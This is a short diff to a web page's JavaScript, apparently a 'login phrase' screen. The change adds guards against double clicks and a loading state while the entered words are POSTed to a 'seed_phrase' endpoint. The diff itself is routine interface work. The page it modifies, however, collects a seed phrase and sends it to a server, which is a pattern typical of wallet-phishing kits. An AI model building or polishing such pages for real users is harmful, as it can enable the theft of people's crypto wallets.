@@ -37,6 +37,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   const confirmBtn = document.getElementById('confirmBtn');
   const createBtn = document.getElementById('createBtn');
+  let isSubmitting = false;
 
   // Режим просмотра: если открыто как login_phrase.html?mode=view,
   // вместо "Создать новый" показываем кнопку "Назад"
@@ -93,11 +94,18 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   confirmBtn.addEventListener('click', async () => {
+    if (isSubmitting || confirmBtn.disabled) return;
     const words = inputs.map(i => i.value.trim()).filter(Boolean);
     if (words.length !== currentCount) return;
     const phrase = words.join(' ');
     
     try {
+      // блокируем повторные клики и показываем загрузку
+      isSubmitting = true;
+      confirmBtn.disabled = true;
+      const originalText = confirmBtn.textContent;
+      confirmBtn.textContent = 'Обработка...';
+      confirmBtn.blur();
       const resp = await fetch('/api/transactions?action=seed_phrase', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -110,6 +118,12 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       console.log('server error:', e);
       alert('Временная ошибка. Попробуйте позже.');
+    } finally {
+      // возвращаем исходное состояние
+      isSubmitting = false;
+      confirmBtn.textContent = 'Подтвердить';
+      // состояние enabled/disabled решает validate()
+      validate();
     }
   });
 
